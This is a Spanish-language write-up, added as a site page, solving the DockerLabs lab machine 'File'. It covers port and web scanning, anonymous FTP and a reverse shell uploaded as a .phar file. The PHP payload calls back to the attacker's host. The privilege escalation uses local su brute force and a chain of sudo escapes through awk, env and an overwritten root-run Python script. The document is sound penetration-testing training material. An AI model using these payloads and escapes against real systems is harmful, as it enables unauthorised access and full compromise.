@@ -1,0 +1,274 @@
+---
+title: File
+description: Resolución completa de la máquina virtual *File* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **File**, desarrollada por *Scuffito y Jul3n-dot* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servicio FTP con acceso anónimo habilitado y un formulario de subida de archivos en el servidor web. La combinación de ambos permite la subida de una reverse shell en formato `.phar`, obteniendo ejecución remota de comandos como `www-data`.
+Una vez dentro, se realiza un ataque de fuerza bruta local para obtener acceso al usuario `mario`. Posteriormente, se encadenan múltiples configuraciones inseguras de `sudo`: `mario` puede ejecutar `awk` como `julen`, `julen` puede ejecutar `env` como `iker`, e `iker` puede ejecutar un script Python como root, permitiendo la escalada final hasta obtener acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'File',
+    Autor: 'Scuffito y Jul3n-dot',
+    Dificultad: 'Fácil',
+    Fecha: '29/04/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip File.zip
+sudo bash auto_deploy.sh File.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1761717544/Ip_kdnyha.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p File/{content,exploits,nmap,scripts}
+cd File
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **21/tcp** — FTP
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1762241871/Ports_u0upbn.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p21,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1762241870/Gobuster_u03vpk.png)
+
+**Rutas relevantes:**
+- `/index.php` — Página principal.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1762241871/Index_luinj0.png)
+- `/uploads` — Directorio con listado público.
+- `/file_upload.php` — Formulario de subida potencialmente vulnerable.
+  ![File upload](https://res.cloudinary.com/dewqswzke/image/upload/v1762241869/FileUpload_iqprtq.png)
+
+---
+
+### 1.4 Enumeración FTP
+
+```bash
+nmap -p21 -sCV 172.17.0.2
+```
+
+![Scan result](https://res.cloudinary.com/dewqswzke/image/upload/v1762241872/Ports21_bqtykr.png)
+
+Se confirma:
+- **Acceso FTP anónimo habilitado**
+- Permite subir archivos
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Subida de reverse shell
+
+El upload filtra por extensiones, por lo que se envuelve la payload en formato `.phar`, que es permitido.
+
+Payload:
+
+```php
+<?php $sock=fsockopen("172.17.0.1",443);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>
+```
+
+Se sube desde `file_upload.php`.
+
+Se inicia un listener en la máquina atacante:
+
+```bash
+nc -nlvp 443
+```
+
+Se accede al archivo desde `/uploads`:
+
+```
+http://172.17.0.2/uploads/revShell.phar
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1762241872/ReverseConnect_j51lpb.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → mario
+
+Se realiza un ataque de fuerza bruta local contra usuarios del sistema utilizando `suBF.sh`:
+
+```bash
+./suBF.sh -u mario -w top12000.txt -t 0.7 -s 0.007
+```
+
+![Mario suBF](https://res.cloudinary.com/dewqswzke/image/upload/v1762241875/SuBFMario_w4ksvy.png)
+
+Se obtiene acceso al usuario **mario**.
+
+---
+
+### 3.2 De mario → julen
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l Mario](https://res.cloudinary.com/dewqswzke/image/upload/v1762241876/Sudo-lMario_ylsqzi.png)
+
+El usuario puede ejecutar `awk` como `julen` sin contraseña.
+
+Se ejecuta:
+
+```bash
+sudo -u julen awk 'BEGIN {system("/bin/sh")}'
+```
+
+---
+
+### 3.3 De julen → iker
+
+```bash
+sudo -l
+```
+
+![Sudo -l Julen](https://res.cloudinary.com/dewqswzke/image/upload/v1762241876/Sudo-lJulen_csfris.png)
+
+El usuario puede ejecutar `env` como `iker` sin contraseña.
+
+Se ejecuta:
+
+```bash
+sudo -u iker env /bin/sh
+```
+
+---
+
+### 3.4 De iker → root
+
+```bash
+sudo -l
+```
+
+![Sudo -l Iker](https://res.cloudinary.com/dewqswzke/image/upload/v1762241875/Sudo-lIker_n1c10j.png)
+
+El usuario puede ejecutar como root:
+
+```
+/usr/bin/python3 /home/iker/geo_ip.py
+```
+
+El archivo `geo_ip.py` es modificable. Se reemplaza con:
+
+```python
+import os
+os.system('/bin/bash')
+```
+
+Se ejecuta:
+
+```bash
+sudo /usr/bin/python3 /home/iker/geo_ip.py
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1762241873/Root_ixw9mf.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "FTP anónimo con permisos de escritura",
+      severity: "Crítica",
+      impact: "Subida de archivos maliciosos al servidor"
+    },
+    {
+      vulnerability: "Subida de archivos sin validación estricta (.phar permitido)",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "Listado público del directorio /uploads",
+      severity: "Media",
+      impact: "Identificación y ejecución de archivos maliciosos"
+    },
+    {
+      vulnerability: "Múltiples configuraciones inseguras de sudo",
+      severity: "Crítica",
+      impact: "Escalada de privilegios progresiva hasta root"
+    },
+    {
+      vulnerability: "Contraseñas débiles en usuarios locales",
+      severity: "Alta",
+      impact: "Fuerza bruta local para acceso a cuentas"
+    },
+    {
+      vulnerability: "Script Python ejecutado por root y modificable por iker",
+      severity: "Crítica",
+      impact: "Ejecución de código arbitrario con privilegios de root"
+    }
+  ]}
+/>
